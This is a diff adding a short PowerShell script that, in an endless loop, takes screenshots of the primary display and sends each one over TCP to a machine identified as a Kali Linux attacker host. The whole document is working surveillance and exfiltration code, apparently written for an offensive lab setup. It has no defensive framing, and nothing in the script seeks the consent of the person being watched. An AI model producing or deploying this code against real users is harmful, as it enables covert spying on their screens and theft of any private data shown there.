@@ -1,0 +1,42 @@
+# PowerShell Client Script
+$kaliIP = "192.168.0.111" # Replace with your Kali Linux IP address
+$port = 5000
+
+while ($true) {
+    # Capture Screen
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-Type -AssemblyName System.Drawing
+
+    $screen = [System.Windows.Forms.Screen]::PrimaryScreen
+    $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
+    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
+
+    # Save the screenshot temporarily
+    $screenshotPath = "$env:TEMP\screenshot.png"
+    $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
+
+    # Read the image into a byte array
+    $imageData = [System.IO.File]::ReadAllBytes($screenshotPath)
+
+    # Prepare to send the data
+    $client = New-Object System.Net.Sockets.TcpClient($kaliIP, $port)
+    $stream = $client.GetStream()
+
+    # Send the image size first (4 bytes)
+    $size = [BitConverter]::GetBytes($imageData.Length)
+    [Array]::Reverse($size)  # Ensure the byte order is big-endian
+    $stream.Write($size, 0, 4)
+
+    # Send the image data
+    $stream.Write($imageData, 0, $imageData.Length)
+    $stream.Flush()
+
+    Write-Host "Screenshot sent to $kaliIP on port $port"
+
+    # Clean up
+    $client.Close()
+    Remove-Item -Path $screenshotPath -Force
+
+    Start-Sleep -Milliseconds 100  # Adjust delay for refresh rate
+}
